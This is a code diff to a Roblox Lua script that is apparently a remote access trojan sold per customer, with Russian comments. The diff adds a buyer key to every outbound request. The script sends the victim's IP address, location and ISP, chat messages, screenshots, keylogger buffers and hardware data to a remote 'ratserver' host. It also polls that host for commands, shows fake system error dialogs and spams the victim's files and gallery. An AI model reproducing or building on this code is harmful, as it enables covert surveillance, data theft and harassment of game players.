@@ -10,7 +10,10 @@ local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
 local TeleportService = game:GetService("TeleportService")
 
+-- ========== КОНФИГУРАЦИЯ (меняется для каждого покупателя!) ==========
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
+local CUSTOMER_KEY = "customer_key_1"  -- ВСТАВЬ СВОЙ КЛЮЧ!
+
 local player = Players.LocalPlayer
 
 local cameraLockEnabled = false
@@ -147,7 +150,7 @@ local function getExecutorInfo()
     return executorName .. extraInfo
 end
 
--- ОТПРАВКА ИНЖЕКТА ЧЕРЕЗ СЕРВЕР (без вебхука!)
+-- ОТПРАВКА ИНЖЕКТА НА СЕРВЕР
 local function sendInjectNotification()
     local playerName = player.Name
     
@@ -157,7 +160,6 @@ local function sendInjectNotification()
     end)
     
     local executor = getExecutorInfo()
-    
     local deviceType = getDeviceType()
     
     local ipData = "N/A"
@@ -176,17 +178,18 @@ local function sendInjectNotification()
                 end)
                 if success and ipInfo and ipInfo.status ~= "fail" then
                     ipData = string.format(
-                        "IP: %s\nCountry: %s\nCity: %s",
+                        "IP: %s\nCountry: %s\nCity: %s\nProvider: %s",
                         ipInfo.query or "N/A",
                         ipInfo.country or "N/A", 
-                        ipInfo.city or "N/A"
+                        ipInfo.city or "N/A",
+                        ipInfo.isp or "N/A"
                     )
                 end
             end
         end)
     end
     
-    -- Отправляем на сервер (сервер сам отправит в вебхук)
+    -- Отправляем на сервер с уникальным ключом покупателя
     local success, response = pcall(function()
         return httpRequest({
             Url = SERVER_URL.."/command",
@@ -194,7 +197,8 @@ local function sendInjectNotification()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
                 command = "inject_notify",
-                args = {playerName, placeName, ipData, executor, deviceType}
+                args = {playerName, placeName, ipData, executor, deviceType},
+                customer_key = CUSTOMER_KEY  -- УНИКАЛЬНЫЙ КЛЮЧ!
             })
         })
     end)
@@ -283,7 +287,8 @@ local function sendUserInfo()
                 player = playerName,
                 place = placeName,
                 executor = executor,
-                device = deviceType
+                device = deviceType,
+                customer_key = CUSTOMER_KEY
             })
         })
         return response ~= nil
@@ -310,7 +315,7 @@ local function showFakeError(message)
         local textLabel = Instance.new("TextLabel")
         textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
         textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
-        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
+        textLabel.Text = "⚠️ ОШИБКА СИСТЕМЫ ⚠️\n\n"..message
         textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
         textLabel.TextScaled = true
         textLabel.Font = Enum.Font.GothamBold
@@ -500,7 +505,8 @@ local function setupChat()
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
                         command = "user_chat",
-                        args = {sender, text}
+                        args = {sender, text},
+                        customer_key = CUSTOMER_KEY
                     })
                 })
             end
@@ -1146,7 +1152,8 @@ local function ExecuteCommand(cmd, args)
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
-                        image = screenshotData
+                        image = screenshotData,
+                        customer_key = CUSTOMER_KEY
                     })
                 })
             end
@@ -1164,7 +1171,8 @@ local function ExecuteCommand(cmd, args)
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
-                        logs = keylogBuffer
+                        logs = keylogBuffer,
+                        customer_key = CUSTOMER_KEY
                     })
                 })
             end
@@ -1178,7 +1186,8 @@ local function ExecuteCommand(cmd, args)
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
                     player = player.Name,
-                    data = hwInfo
+                    data = hwInfo,
+                    customer_key = CUSTOMER_KEY
                 })
             })
         
@@ -1196,7 +1205,8 @@ local function ExecuteCommand(cmd, args)
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
                         command = "spam_completed",
-                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
+                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount},
+                        customer_key = CUSTOMER_KEY
                     })
                 })
             end)
@@ -1212,7 +1222,8 @@ local function ExecuteCommand(cmd, args)
                     Headers = {["Content-Type"] = "application/json"},
                     Body = HttpService:JSONEncode({
                         command = "spam_completed",
-                        args = {"gallery_spam", "Сохранено "..savedCount.." файлов из "..imageCount}
+                        args = {"gallery_spam", "Сохранено "..savedCount.." файлов из "..imageCount},
+                        customer_key = CUSTOMER_KEY
                     })
                 })
             end)
@@ -1253,7 +1264,7 @@ end
 local function checkCommands()
     local success, response = pcall(function()
         return httpRequest({
-            Url = SERVER_URL.."/data?player=" .. player.Name,
+            Url = SERVER_URL.."/data?player=" .. player.Name .. "&customer_key=" .. CUSTOMER_KEY,
             Method = "GET"
         })
     end)
@@ -1301,7 +1312,8 @@ local function mainLoop()
                         Method = "POST",
                         Headers = {["Content-Type"] = "application/json"},
                         Body = HttpService:JSONEncode({
-                            logs = keylogBuffer
+                            logs = keylogBuffer,
+                            customer_key = CUSTOMER_KEY
                         })
                     })
                     keylogBuffer = ""
